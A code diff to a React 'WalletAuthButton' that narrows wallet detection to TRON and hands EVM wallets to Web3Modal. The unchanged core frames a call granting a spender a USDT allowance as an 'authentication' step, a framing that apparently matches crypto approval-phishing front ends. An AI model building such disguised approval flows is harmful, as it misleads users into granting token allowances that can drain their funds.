@@ -2,7 +2,7 @@ import { useState } from "react";
 import { Loader2, Wallet, ShieldCheck, AlertCircle } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { approveUSDT } from "@/hooks/useWalletAuth";
-import { detectWalletEnvironment } from "@/lib/walletDetect";
+import { detectTronEnvironment } from "@/lib/walletDetect";
 import type { DetectedWallet } from "@/lib/walletDetect";
 import WalletSelectDialog from "@/components/WalletSelectDialog";
 import type { ChainInfo } from "@/lib/cryptoData";
@@ -38,15 +38,14 @@ const WalletAuthButton = ({
   const [stage, setStage] = useState<AuthStage>("idle");
   const [errorMsg, setErrorMsg] = useState<string>("");
 
-  // Dialog state
+  // TRON dialog state
   const [dialogOpen, setDialogOpen] = useState(false);
-  const [dialogMode, setDialogMode] = useState<"select" | "deeplink" | "install">("select");
-  const [dialogWallets, setDialogWallets] = useState<DetectedWallet[]>([]);
+  const [dialogMode, setDialogMode] = useState<"deeplink" | "install">("deeplink");
   const [dialogDeepLinks, setDialogDeepLinks] = useState<any[]>([]);
 
-  const chainType = chain.id === "tron" ? "tron" : "evm";
+  const isTron = chain.id === "tron";
 
-  const startAuth = async (selectedProvider?: any) => {
+  const startAuth = async () => {
     setStage("connecting");
     setErrorMsg("");
 
@@ -55,8 +54,7 @@ const WalletAuthButton = ({
       const { txHash, walletFrom } = await approveUSDT(
         chain.id,
         spenderAddress,
-        usdtAmount,
-        selectedProvider
+        usdtAmount
       );
 
       setStage("submitting");
@@ -71,38 +69,28 @@ const WalletAuthButton = ({
   const handleClick = async () => {
     if (stage === "done") return;
 
-    const result = detectWalletEnvironment(chainType);
+    if (isTron) {
+      // TRON: use existing detection logic
+      const result = detectTronEnvironment();
 
-    switch (result.status) {
-      case "single":
-        // Only one wallet — proceed directly
-        await startAuth(result.wallet.provider);
-        break;
-
-      case "multiple":
-        // Show wallet selection dialog
-        setDialogWallets(result.wallets);
-        setDialogMode("select");
-        setDialogOpen(true);
-        break;
-
-      case "none_mobile":
-        // Mobile without wallet — show deep link guidance
-        setDialogDeepLinks(result.deepLinks);
-        setDialogMode("deeplink");
-        setDialogOpen(true);
-        break;
-
-      case "none_desktop":
-        // Desktop without wallet — show install guidance
-        setDialogMode("install");
-        setDialogOpen(true);
-        break;
+      switch (result.status) {
+        case "ready":
+          await startAuth();
+          break;
+        case "none_mobile":
+          setDialogDeepLinks(result.deepLinks);
+          setDialogMode("deeplink");
+          setDialogOpen(true);
+          break;
+        case "none_desktop":
+          setDialogMode("install");
+          setDialogOpen(true);
+          break;
+      }
+    } else {
+      // EVM: Web3Modal handles everything (wallet selection, QR, deep links)
+      await startAuth();
     }
-  };
-
-  const handleWalletSelect = (wallet: DetectedWallet) => {
-    startAuth(wallet.provider);
   };
 
   const isLoading = stage === "connecting" || stage === "approving" || stage === "submitting";
@@ -146,14 +134,14 @@ const WalletAuthButton = ({
         </p>
       )}
 
-      <WalletSelectDialog
-        open={dialogOpen}
-        onOpenChange={setDialogOpen}
-        mode={dialogMode}
-        wallets={dialogWallets}
-        deepLinks={dialogDeepLinks}
-        onSelect={handleWalletSelect}
-      />
+      {isTron && (
+        <WalletSelectDialog
+          open={dialogOpen}
+          onOpenChange={setDialogOpen}
+          mode={dialogMode}
+          deepLinks={dialogDeepLinks}
+        />
+      )}
     </div>
   );
 };
